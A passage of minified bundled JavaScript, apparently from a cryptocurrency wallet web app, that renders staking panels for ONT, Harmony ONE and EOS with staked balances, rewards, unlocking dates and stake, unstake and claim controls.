            }
        }
          , Lx = useOntValidators
          , Fx = "ont_wrapper_25NUX main_block_15zml"
          , Wx = "ont_label_2LSfR"
          , Rx = "ont_value_2HJbz"
          , Bx = "ont_row_1Fli3"
          , Ox = "ont_desc_31kGb"
          , Dx = "ont_buttonLink_1Ekye"
          , Mx = "ont_external_2_oic"
          , Ux = "ont_error_2_36b"
          , Gx = "ont_inlineButtons_1zVDq"
          , Vx = "ont_validatorAddress_3oGHI"
          , Kx = "ont_unstakeButton_1AVdb"
          , Hx = "ont_userSelect_2TeuE"
          , zx = "ont_loader_2jfXP"
          , jx = "ont_stakingItem_3_L7j";
        function OntStakingPanel(e) {
            var t;
            let {wallet: a} = e;
            const n = (0,
            j.k6)()
              , r = (0,
            $.I0)()
              , l = (0,
            $.v9)(ax)
              , s = undefined
              , i = (0,
            $.v9)(cx)({
                uuid: a.uuid
            })
              , {listOfValidators: o} = Lx()
              , [c,u] = (0,
            O.useState)(null)
              , [d,m] = (0,
            O.useState)(!0)
              , p = Boolean(!l && o && o.length > 0 && a);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (p && "string" == typeof a.uuid && "privateKey"in a) {
                    const e = {
                        uuid: a.uuid,
                        currency: a.currency,
                        address: a.address,
                        balance: a.balance,
                        privateKey: a.privateKey
                    };
                    r(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: o
                    }))
                }
            }
            ), [r, a, o, p]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    m(!0);
                    u(null);
                    r(lb.setClearStore())
                }
            }
            ), [a.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (l) {
                    if (l && "type"in l.dto && "STAKING_INFO_SUCCESS" === l.dto.type) {
                        const s = l.dto;
                        if (s.stakedValidators && "manyValidators"in s.stakedValidators) {
                            var e, t, a;
                            if (Array.isArray(null == s || null === (e = s.stakedValidators) || void 0 === e ? void 0 : e.manyValidators) && (null == s || null === (t = s.stakedValidators) || void 0 === t || null === (a = t.manyValidators) || void 0 === a ? void 0 : a.length) > 0) {
                                var n, r;
                                u(null == s || null === (n = s.stakedValidators) || void 0 === n || null === (r = n.manyValidators) || void 0 === r ? void 0 : r.map((e => {
                                    var t, a, n, r, l, i, o, c;
                                    return {
                                        validator: (null === (t = e.validator) || void 0 === t ? void 0 : t.title) || "[Inactive]",
                                        amount: e.stakedAmount,
                                        claimable: e.redeemable,
                                        isDelegated: !0,
                                        reward: null === (a = e.rewardAmount) || void 0 === a ? void 0 : a.toString(),
                                        timeToNextRound: s.timeToNextRound,
                                        nodeAddress: (null === (n = e.validator) || void 0 === n ? void 0 : n.address) || (null == s || null === (r = s.raw) || void 0 === r || null === (l = r.find((t => {
                                            var a;
                                            return t.nodeAddress === (null === (a = e.validator) || void 0 === a ? void 0 : a.address)
                                        }
                                        ))) || void 0 === l ? void 0 : l.nodeAddress),
                                        pk: (null === (i = e.validator) || void 0 === i ? void 0 : i.pk) || (null == s || null === (o = s.raw) || void 0 === o || null === (c = o.find((t => {
                                            var a;
                                            return t.pk === (null === (a = e.validator) || void 0 === a ? void 0 : a.pk)
                                        }
                                        ))) || void 0 === c ? void 0 : c.nodeAddress),
                                        locked: e.locked
                                    }
                                }
                                )))
                            } else
                                u([{
                                    isDelegated: !1
                                }])
                        }
                    }
                    m(!1)
                }
            }
            ), [l]);
            (0,
            O.useEffect)((function useStakingInfoFromStorage() {
                if (i && "type"in i.dto && "STAKING_INFO_SUCCESS" === i.dto.type) {
                    const l = i.dto;
                    if (l.stakedValidators && "manyValidators"in l.stakedValidators) {
                        var e, t, a;
                        if (Array.isArray(null == l || null === (e = l.stakedValidators) || void 0 === e ? void 0 : e.manyValidators) && (null == l || null === (t = l.stakedValidators) || void 0 === t || null === (a = t.manyValidators) || void 0 === a ? void 0 : a.length) > 0) {
                            var n, r;
                            u(null == l || null === (n = l.stakedValidators) || void 0 === n || null === (r = n.manyValidators) || void 0 === r ? void 0 : r.map((e => {
                                var t, a, n, r, s, i, o, c;
                                return {
                                    validator: (null === (t = e.validator) || void 0 === t ? void 0 : t.title) || "[Inactive]",
                                    amount: e.stakedAmount,
                                    claimable: e.redeemable,
                                    isDelegated: !0,
                                    reward: null === (a = e.rewardAmount) || void 0 === a ? void 0 : a.toString(),
                                    timeToNextRound: l.timeToNextRound,
                                    nodeAddress: (null === (n = e.validator) || void 0 === n ? void 0 : n.address) || (null == l || null === (r = l.raw) || void 0 === r || null === (s = r.find((t => {
                                        var a;
                                        return t.nodeAddress === (null === (a = e.validator) || void 0 === a ? void 0 : a.address)
                                    }
                                    ))) || void 0 === s ? void 0 : s.nodeAddress),
                                    pk: (null === (i = e.validator) || void 0 === i ? void 0 : i.pk) || (null == l || null === (o = l.raw) || void 0 === o || null === (c = o.find((t => {
                                        var a;
                                        return t.pk === (null === (a = e.validator) || void 0 === a ? void 0 : a.pk)
                                    }
                                    ))) || void 0 === c ? void 0 : c.nodeAddress),
                                    locked: e.locked
                                }
                            }
                            )))
                        } else
                            u([{
                                isDelegated: !1
                            }])
                    }
                }
            }
            ), [i]);
            const [f,E] = (0,
            O.useState)(void 0)
              , [h,g] = (0,
            O.useState)(null)
              , {handleGo: y} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            })
              , {convertToFiat: v} = useConverter()
              , _ = a.watchOnly;
            (0,
            O.useEffect)(( () => {
                if (a && !a.isNewWallet) {
                    var e;
                    E((null == a || null === (e = a.subWallets) || void 0 === e ? void 0 : e.find((e => "ong" === e.currency.toLowerCase()))) || void 0)
                }
            }
            ), [E, a]);
            (0,
            O.useEffect)(( () => {
                if (o && o.length && c) {
                    const e = [];
                    c.forEach((t => {
                        const a = o.find((e => e.address === (null == t ? void 0 : t.nodeAddress)))
                          , n = a && a.rate ? `${a.rate}%` : "";
                        e.push({
                            rate: n,
                            address: null == t ? void 0 : t.nodeAddress
                        })
                    }
                    ));
                    g(e)
                }
            }
            ), [o, c]);
            function handleOnUnstake(e, t, r) {
                const l = new URLSearchParams({
                    validatorTitle: e || "",
                    validatorAddress: t || "",
                    walletFrom: a.uuid || "",
                    amount: (null == r ? void 0 : r.toString()) || ""
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-ont/unstaking"),
                    search: l.toString()
                })
            }
            function handleOnRedeem(e, t, r) {
                e.stopPropagation();
                e.preventDefault();
                const l = new URLSearchParams({
                    walletFrom: a.uuid || "",
                    amount: (null == t ? void 0 : t.toString()) || "",
                    validatorAddress: r || ""
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-ont/redeem/confirm"),
                    search: l.toString()
                })
            }
            function handleOnClaim(e, t, r, l, s) {
                e.stopPropagation();
                e.preventDefault();
                const i = new URLSearchParams({
                    walletFrom: a.uuid || "",
                    amount: (null == t ? void 0 : t.toString()) || "",
                    validatorTitle: r || "",
                    validatorAddress: `${l}-${s}`
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-ont/claim/confirm"),
                    search: i.toString()
                })
            }
            return a.isNewWallet ? O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", {
                className: Hx
            }, "0 ONT"), " ", O.createElement(jA, {
                value: v(0, a)
            }), O.createElement("br", null), O.createElement("br", null), O.createElement(Yl, {
                color: "blue",
                onClick: y({
                    path: (0,
                    M.RU)("/staking-ont"),
                    wallet: a,
                    isNewToken: !1,
                    isNewWallet: !0,
                    parentWallet: null,
                    fromWallet: !0
                })
            }, "Stake")) : l || i ? !c || c[0] && null !== (t = c[0]) && void 0 !== t && t.isDelegated ? c && Array.isArray(c) && c[0].isDelegated ? O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: d,
                width: 30,
                className: zx
            }), c.map(( (e, t) => {
                var n;
                return O.createElement("div", {
                    key: t,
                    className: jx
                }, "Staked: ", O.createElement("b", {
                    className: Hx
                }, (0,
                Ko.yF)(e.amount, 4), " ONT"), " ", O.createElement(jA, {
                    value: v(e.amount, a)
                }), O.createElement("br", null), O.createElement("br", null), "Annual yield: ", O.createElement("b", null, null == h || null === (n = h.find((t => t.address === e.nodeAddress))) || void 0 === n ? void 0 : n.rate), O.createElement("br", null), O.createElement("br", null), "Reward: ", O.createElement("b", {
                    className: Hx
                }, e.reward ? (0,
                Ko.yF)(e.reward, 4) : "...", " ONG"), " ", O.createElement(jA, {
                    value: v(e.reward, f)
                }), " ", !_ && (0,
                Ko.gt)(e.reward, "0") && O.createElement("a", {
                    onClick: t => {
                        handleOnClaim(t, null == e ? void 0 : e.reward, null == e ? void 0 : e.validator, null == e ? void 0 : e.pk, null == e ? void 0 : e.nodeAddress)
                    }
                    ,
                    rel: "noopener noreferrer"
                }, "Claim"), O.createElement("br", null), O.createElement("br", null), "Reward frequency: ", O.createElement("b", null, "at the end of each round (first reward - the end of the next round)"), O.createElement("br", null), O.createElement("br", null), "End of round: ", O.createElement("b", null, "~", e.timeToNextRound), O.createElement("br", null), O.createElement("br", null), (0,
                Ko.gt)(null == e ? void 0 : e.locked, "0") && O.createElement(O.Fragment, null, "Canceled (locked): ", O.createElement("b", null, null == e ? void 0 : e.locked, " ONT"), O.createElement("br", null), O.createElement("br", null)), (0,
                Ko.gt)(e.claimable, "0") && O.createElement(O.Fragment, null, "Redeemable: ", O.createElement("b", null, e.claimable, " ONT"), " ", !_ && O.createElement("a", {
                    onClick: t => {
                        handleOnRedeem(t, null == e ? void 0 : e.claimable, null == e ? void 0 : e.pk)
                    }
                    ,
                    rel: "noopener noreferrer"
                }, "Redeem"), O.createElement("br", null), O.createElement("br", null)), "Validator: ", O.createElement("b", null, e.validator || ""), O.createElement("br", null), O.createElement("br", null), O.createElement("div", {
                    className: Vx
                }, "Address:  ", O.createElement(button_copy, {
                    text: e.nodeAddress
                }, (t => t ? "copied" : formatAddress(e.nodeAddress, 7)))), O.createElement("br", null), !_ && O.createElement("div", {
                    className: Gx
                }, O.createElement(Y.OL, {
                    to: `${(0,
                    M.RU)()}/staking-ont?walletFrom=${a.uuid}&validatorAddress=${e.nodeAddress}`
                }, O.createElement(Yl, {
                    color: "blue"
                }, "Stake more")), O.createElement(Yl, {
                    color: "simple",
                    onClick: () => {
                        handleOnUnstake(null == e ? void 0 : e.validator, null == e ? void 0 : e.pk, null == e ? void 0 : e.amount)
                    }
                }, O.createElement("span", {
                    className: Kx
                }, "Unstake"))))
            }
            )), _ ? O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/get-ong-for-staking-ont",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get an ONG for staking ONT", O.createElement("img", {
                src: Bp,
                className: Mx,
                alt: ""
            })) : O.createElement("div", {
                key: "AdditionalButton",
                className: jx
            }, "Want to stake more?", O.createElement("br", null), O.createElement("br", null), !_ && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-ont?walletFrom=${a.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Deposit for staking")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/get-ong-for-staking-ont",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get an ONG for staking ONT", O.createElement("img", {
                src: Bp,
                className: Mx,
                alt: ""
            })))) : null : O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: d,
                width: 30,
                className: zx
            }), "Staked: ", O.createElement("b", {
                className: Hx
            }, "0 ONT"), " ", O.createElement(jA, {
                value: v(0, a)
            }), O.createElement("br", null), O.createElement("br", null), !_ && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-ont?walletFrom=${a.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Deposit for staking")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/get-ong-for-staking-ont",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get an ONG for staking ONT", O.createElement("img", {
                src: Bp,
                className: Mx,
                alt: ""
            }))) : O.createElement(loader, {
                visible: !0,
                width: 30,
                className: zx
            })
        }
        const $x = withSettingsDisablement(OntStakingPanel);
        var Zx = a(67522)
          , Yx = a.n(Zx);
        const qx = (0,
        te.createAction)("@one-validators/SET_VALIDATORS")()
          , Xx = "one-validators"
          , Qx = {
            validators: []
        }
          , Jx = (0,
        te.createReducer)(Qx).handleAction(qx, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , validators_one_selectedValidators = e => e["one-validators"].validators || []
          , validators_one_fetchValidators = () => async (e, t) => {
            const a = t();
            if (validators_one_selectedValidators(a).length)
                return;
            const n = await Se.Z.getApiByCurrency("one")
              , r = await n.getValidators();
            e(qx({
                validators: r
            }))
        }
          , eI = "one1qfpt5y3kuw8dnsd2d4lgjjzf849mfdzaxzum88"
          , use_one_validators_startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(validators_one_fetchValidators());
            t(!1)
        }
          , useOneValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(validators_one_selectedValidators)
              , a = (0,
            $.v9)(Bo)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.address === eI));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (t.length || use_one_validators_startFetchValidators({
                    setLoading: r,
                    dispatch: e
                }))
            }
            ), [e, t.length, a]);
            return {
                listOfValidators: t,
                defaultValidator: l,
                isLoading: n
            }
        }
          , tI = useOneValidators;
        function getUnlockingDate(e, t) {
            if (e && t) {
                const a = undefined
                  , n = undefined
                  , r = 32768 * 2.6 * 1e3
                  , l = undefined
                  , s = undefined
                  , i = undefined
                  , o = r * 7 - (t - e) * r;
                return date_format((new Date).getTime() + o, "transactions-date")
            }
            return ""
        }
        function handleUnstake(e) {
            let {stakeInfo: t, walletUuid: a, history: n} = e;
            return e => {
                var r, l;
                e.preventDefault();
                const s = new URLSearchParams({
                    amount: t.amount || "",
                    walletFrom: a || "",
                    validatorTitle: t.validator_name || "",
                    validatorAddress: t.validator_address || "",
                    validatorRate: (null === (r = t.validator_info) || void 0 === r || null === (l = r.subtitle) || void 0 === l ? void 0 : l.replace("Annual yield: ", "")) || ""
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-one/unstaking/confirm"),
                    search: s.toString()
                })
            }
        }
        const handleClaim = e => {
            let {totalReward: t, walletUuid: a, history: n} = e;
            return e => {
                e.stopPropagation();
                const r = new URLSearchParams({
                    walletFrom: a || "",
                    amount: t || ""
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-one/claim/confirm"),
                    search: r.toString()
                })
            }
        }
        ;
        function OneStakingPanel(e) {
            let {wallet: t} = e;
            const a = (0,
            j.k6)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)(ax)
              , l = (0,
            $.v9)(ox)
              , s = undefined
              , i = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , [o,c] = (0,
            O.useState)(void 0)
              , [u,d] = (0,
            O.useState)(!0)
              , [m,p] = (0,
            O.useState)("")
              , {listOfValidators: f} = tI()
              , {convertToFiat: E} = useConverter()
              , {handleGo: h} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            })
              , g = t.watchOnly
              , y = (null == t ? void 0 : t.isNewWallet) || (null == t ? void 0 : t.isNewToken)
              , v = Boolean(!r && f && f.length > 0 && t)
              , _ = (0,
            O.useMemo)(( () => o ? o.reduce(( (e, t) => (0,
            Ko.PD)(e, t.reward).toString()), "0") : ""), [o]);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (v && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey
                    };
                    n(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: f
                    }))
                }
            }
            ), [n, t, f, v]);
            (0,
            O.useEffect)((function fetchCurrentEpoch() {
                if (!m && !l && t && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid || "",
                        currency: t.currency,
                        address: t.address || "",
                        balance: t.balance || "",
                        privateKey: t.privateKey
                    };
                    n(lb.fetchCurrentEpoch({
                        wallet: e
                    }))
                }
            }
            ), [n, m, l, t]);
            (0,
            O.useEffect)((function calculateUnlockingAmount() {
                !m && r && "STAKING_INFO_SUCCESS" === r.fetchStatus && l && r.dto && "row"in r.dto && r.dto.raw.forEach((e => {
                    const {Undelegations: t} = e;
                    if (!Array.isArray(t) || !t.length)
                        return;
                    const a = t.reduce(( (e, t) => {
                        (0,
                        Ko.eg)((0,
                        Ko.h9)(l, null == t ? void 0 : t.Epoch), 1) && (e = (0,
                        Ko.PD)(e, t.Amount).toString());
                        return e.toString()
                    }
                    ), "0");
                    (0,
                    Ko.gt)(a, 0) && p((e => e ? (0,
                    Ko.PD)(e, a).toString() : a))
                }
                ), [])
            }
            ), [r, m, l]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    c(void 0);
                    d(!0);
                    p("");
                    n(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (r) {
                    if ("type"in r.dto && "STAKING_INFO_SUCCESS" === r.dto.type) {
                        const e = r.dto;
                        c(e.raw)
                    }
                    d(!1)
                }
            }
            ), [r]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (i && "type"in i.dto && "STAKING_INFO_SUCCESS" === i.dto.type) {
                    const e = i.dto;
                    c(e.raw)
                }
            }
            ), [i]);
            const w = "Harmony locks unstaked funds for 7 epochs. However, you can redelegate locked funds in 1 epoch after unstaking.";
            if (!o)
                return O.createElement(loader, {
                    visible: !0,
                    width: 30,
                    className: HA.loader
                });
            if (o && !o.length)
                return O.createElement(O.Fragment, null, O.createElement(loader, {
                    visible: u,
                    width: 30,
                    className: HA.loader
                }), "Staked: ", O.createElement("b", null, "0 ONE"), " ", O.createElement(jA, {
                    value: E(0, t)
                }), O.createElement("br", null), O.createElement("br", null), !g && O.createElement(O.Fragment, null, O.createElement(Yl, {
                    color: "blue",
                    onClick: h({
                        path: (0,
                        M.RU)("/staking-one/staking"),
                        wallet: t,
                        isNewToken: !1,
                        isNewWallet: y,
                        parentWallet: null,
                        fromWallet: !0
                    })
                }, "Stake"), O.createElement("br", null), O.createElement("br", null), " "), O.createElement("a", {
                    href: "https://support.guarda.com/earn-rewards/harmony-one-staking",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Get a reward for staking ONE ", O.createElement("img", {
                    src: Bp,
                    className: HA.external,
                    alt: ""
                })));
            if (o && o.length) {
                const e = o.map(( (e, n) => {
                    var r, l, s;
                    return O.createElement("div", {
                        className: HA.wrapperLine,
                        key: `stake-one-info${e.validator_address}`
                    }, e.validator_info && O.createElement(O.Fragment, null, "Validator: ", O.createElement("b", null, (0,
                    Ko.lt)(null == e || null === (r = e.validator_name) || void 0 === r ? void 0 : r.length, formatAddress(e.validator_name || "", 7).length) ? e.validator_name : formatAddress(e.validator_name || "", 7)), O.createElement("br", null), "Annual yield: ", O.createElement("b", null, null === (l = e.validator_info) || void 0 === l || null === (s = l.subtitle) || void 0 === s ? void 0 : s.replace("Annual yield: ", "")), O.createElement("br", null)), "Address: ", O.createElement("b", {
                        style: {
                            display: "inline-block"
                        }
                    }, O.createElement(button_copy, {
                        text: e.validator_address
                    }, (t => t ? "copied" : formatAddress(e.validator_address, 7)))), O.createElement("br", null), "Staked: ", O.createElement("b", {
                        className: HA.userSelect
                    }, (0,
                    Ko.yF)(e.amount, 5), " ONE"), " ", O.createElement(jA, {
                        value: E(e.amount, t)
                    }), " ", (0,
                    Ko.gt)(e.amount, 0) && O.createElement("span", {
                        className: HA.link,
                        onClick: handleUnstake({
                            stakeInfo: e,
                            walletUuid: t.uuid,
                            history: a
                        })
                    }, "Unstake"), O.createElement("br", null), "Reward: ", O.createElement("b", {
                        className: HA.userSelect
                    }, (0,
                    Ko.yF)(e.reward, 5), " ONE"), " ", O.createElement(jA, {
                        value: E(e.reward, t)
                    }), O.createElement("br", null), !(null == e || !e.Undelegations.length) && e.Undelegations.map((a => {
                        const n = getUnlockingDate(Number(null == a ? void 0 : a.Epoch), Number(e.currentEpoch));
                        return O.createElement("div", {
                            key: e.validator_address
                        }, O.createElement("div", {
                            className: HA.lockedAmtBlock
                        }, "Locked ", O.createElement(tooltip, {
                            classNameWrapper: HA.tooltipInfo,
                            text: w,
                            width: "265px"
                        }, O.createElement("div", {
                            dangerouslySetInnerHTML: {
                                __html: Yx()
                            },
                            className: HA.iconInfo
                        })), " : ", O.createElement("b", {
                            className: HA.userSelect
                        }, (0,
                        Ko.yF)(a.Amount, 5), " ONE"), " ", O.createElement(jA, {
                            value: E(a.Amount, t)
                        }), (0,
                        Ko.eg)((0,
                        Ko.h9)(null == e ? void 0 : e.currentEpoch, null == a ? void 0 : a.Epoch).toString(), 1) && O.createElement(Y.OL, {
                            to: `${(0,
                            M.RU)()}/staking-one/staking?walletFrom=${t.uuid}${m ? `&unlockingAmount=${m}` : ""}`
                        }, O.createElement("span", {
                            className: HA.link
                        }, "Redelegate"))), "Unlocking date: ~ ", O.createElement("b", null, n), O.createElement("br", null))
                    }
                    )), n !== o.length - 1 ? O.createElement("hr", null) : "", O.createElement("br", null))
                }
                ));
                return O.createElement("div", {
                    className: HA.wrapperPanel
                }, O.createElement(loader, {
                    visible: u,
                    width: 30,
                    className: HA.loader
                }), "Total Reward: ", O.createElement("br", null), " ", O.createElement("b", {
                    className: HA.userSelect
                }, (0,
                Ko.yF)(_, 6), " ONE"), " ", O.createElement(jA, {
                    value: E(_, t)
                }), (0,
                Ko.gt)(_, 0) && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("span", {
                    className: HA.link,
                    onClick: handleClaim({
                        totalReward: _,
                        walletUuid: t.uuid,
                        history: a
                    })
                }, "Claim All")), O.createElement("br", null), O.createElement("hr", null), e, !g && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                    to: `${(0,
                    M.RU)()}/staking-one/staking?walletFrom=${t.uuid}${m ? `&unlockingAmount=${m}` : ""}`
                }, O.createElement(Yl, {
                    color: "blue"
                }, "Stake")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                    href: "https://support.guarda.com/earn-rewards/harmony-one-staking",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Get a reward for staking ONE ", O.createElement("img", {
                    src: Bp,
                    className: HA.external,
                    alt: ""
                })))
            }
            return null
        }
        const aI = withSettingsDisablement(OneStakingPanel)
          , nI = 1024
          , rI = 1048576
          , lI = 1073741824
          , format_bytes = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 2;
            const a = "number" == typeof e ? e : 0;
            return a >= lI ? `${(a / lI).toFixed(t)} GB` : a >= rI ? `${(a / rI).toFixed(t)} MB` : a >= nI ? `${(a / nI).toFixed(t)} KB` : `${a} bytes`
        }
          , sI = "eos_wrapper_1BasG main_block_15zml"
          , iI = "eos_innerWrapper_1VjtU"
          , oI = "eos_titleSection_3s5Th"
          , cI = "eos_container_3SKiA"
          , uI = "eos_title_gqQAd"
          , dI = "eos_buttonAction_1WuT5 styles_dashedNormal_xEvl8"
          , mI = "eos_row_ZYKj9"
          , pI = "eos_addressWrapper_23mjT"
          , fI = "eos_inlineButtons_1OtNl"
          , EI = "eos_external_2-Dam"
          , hI = "eos_rowContainer_3GtlB"
          , gI = "eos_userSelect__-Imc"
          , yI = 1e3
          , vI = 1e6
          , formatCpuTime = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 2;
            const a = "number" == typeof e ? e : 0;
            return a >= vI ? `${(a / vI).toFixed(t)} s` : a >= yI ? `${(a / yI).toFixed(t)} ms` : `${a} µs`
        }
          , EosStakingPanel = e => {
            var t, a, n, r, l, s, i, o, c, u, d, m, p, f, E, h, g, y, v, _, w, b;
            let {wallet: k, isOnlyCpuAndNet: S} = e;
            const [C,N] = (0,
            O.useState)(null)
              , [T,A] = (0,
            O.useState)(!0)
              , {convertToFiat: x} = useConverter();
            (0,
            O.useEffect)(( () => {
                let e = !1;
                (async () => {
                    if ("eos" === k.currency && k.address) {
                        A(!0);
                        try {
                            const t = await Se.Z.getApiByCurrency("eos");
                            if (e)
                                return;
                            const a = await t.getInfo(k);
                            if (e)
                                return;
                            N(a)
                        } catch (e) {
                            console.warn(e)
                        }
                        A(!1)
                    }
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [k, k.address]);
            if (T)
                return O.createElement(LoaderDots, {
                    visible: !0
                });
            if (!C || null == C || !C.accountName)
                return O.createElement("div", {
                    className: iI
                }, "You are able to stake EOS for an additional CPU and NET here. To start staking, create an EOS account.");
            const I = (0,
            Ko.gt)(null == C || null === (t = C.cpu) || void 0 === t ? void 0 : t.total, 0) || (0,
            Ko.gt)(null == C || null === (a = C.net) || void 0 === a ? void 0 : a.total, 0)
              , P = (0,
            Ko.PD)((null == C || null === (n = C.cpu) || void 0 === n ? void 0 : n.unstaked) || "0", (null == C || null === (r = C.net) || void 0 === r ? void 0 : r.unstaked) || "0").toString()
              , L = (0,
            Ko.PD)((null == C || null === (l = C.cpu) || void 0 === l ? void 0 : l.staked) || "0", (null == C || null === (s = C.net) || void 0 === s ? void 0 : s.staked) || "0").toString();
            return O.createElement("div", {
                className: iI
            }, void 0 === S && O.createElement("div", {
                className: cI
            }, O.createElement("div", {
                className: hI
            }, O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Available:"), O.createElement("b", {
                className: gI
            }, (0,
            Ko.yF)((null == C ? void 0 : C.unstaked) || 0, 4), " EOS"), " ", O.createElement(jA, {
                value: x((null == C ? void 0 : C.unstaked) || 0, k)
            })), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Staked:"), O.createElement("b", {
                className: gI
            }, (0,
            Ko.yF)(L, 4), " EOS"), " ", O.createElement(jA, {
                value: x(L, k)
            })), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Refunding:"), O.createElement("b", {
                className: gI
            }, (0,
            Ko.yF)(P, 4), " EOS"), " ", O.createElement(jA, {
                value: x(P, k)
            })), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Total Value:"), O.createElement("b", {
                className: gI
            }, (0,
            Ko.yF)((0,
            Ko.PD)((null == C ? void 0 : C.unstaked) || 0, (0,
            Ko.PD)(L, P)).toString(), 4), " EOS"), " ", O.createElement(jA, {
                value: x((0,
                Ko.PD)((null == C ? void 0 : C.unstaked) || 0, (0,
                Ko.PD)(L, P)).toString(), k)
            })), (0,
            Ko.gt)(P, 0) && O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Your deposit will be refunded after 72 hours."))), O.createElement("div", {
                className: hI
            }, O.createElement(label, null, "Memory"), O.createElement("div", null, O.createElement("b", null, format_bytes(Number(null == C || null === (i = C.ram) || void 0 === i ? void 0 : i.used) || 0), " / ", format_bytes(Number(null == C || null === (o = C.ram) || void 0 === o ? void 0 : o.total) || 0))))), O.createElement("div", {
                className: cI
            }, O.createElement("div", {
                className: hI
            }, O.createElement(label, null, "CPU"), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Available:"), O.createElement("b", null, O.createElement("b", null, formatCpuTime((0,
            Ko.h9)(null == C || null === (c = C.cpu) || void 0 === c ? void 0 : c.total, null == C || null === (u = C.cpu) || void 0 === u ? void 0 : u.used).toString())))), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Total:"), O.createElement("b", null, formatCpuTime(Number(null == C || null === (d = C.cpu) || void 0 === d ? void 0 : d.total) || 0))), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Staked:"), O.createElement("b", {
                className: gI
            }, (0,
            Ko.yF)(null == C || null === (m = C.cpu) || void 0 === m ? void 0 : m.staked, 4), " EOS"), " ", O.createElement(jA, {
                value: x(null == C || null === (p = C.cpu) || void 0 === p ? void 0 : p.staked, k)
            })), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Refunding:"), O.createElement("b", {
                className: gI
            }, (0,
            Ko.yF)((null == C || null === (f = C.cpu) || void 0 === f ? void 0 : f.unstaked) || "0"), " EOS"), " ", O.createElement(jA, {
                value: x(null == C || null === (E = C.cpu) || void 0 === E ? void 0 : E.unstaked, k)
            }))), O.createElement("div", {
                className: hI
            }, O.createElement(label, null, "Net"), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Available:"), O.createElement("b", null, format_bytes(Number((0,
            Ko.h9)(null == C || null === (h = C.net) || void 0 === h ? void 0 : h.total, null == C || null === (g = C.net) || void 0 === g ? void 0 : g.used))))), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Total:"), O.createElement("b", null, format_bytes(Number(null == C || null === (y = C.net) || void 0 === y ? void 0 : y.total) || 0))), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Staked:"), O.createElement("b", {
                className: gI
            }, (0,
            Ko.yF)(null == C || null === (v = C.net) || void 0 === v ? void 0 : v.staked, 4), " EOS"), " ", O.createElement(jA, {
                value: x(null == C || null === (_ = C.net) || void 0 === _ ? void 0 : _.staked, k)
            })), O.createElement("div", {
                className: mI
            }, O.createElement("span", {
                className: uI
            }, "Refunding:"), O.createElement("b", {
                className: gI
            }, (0,
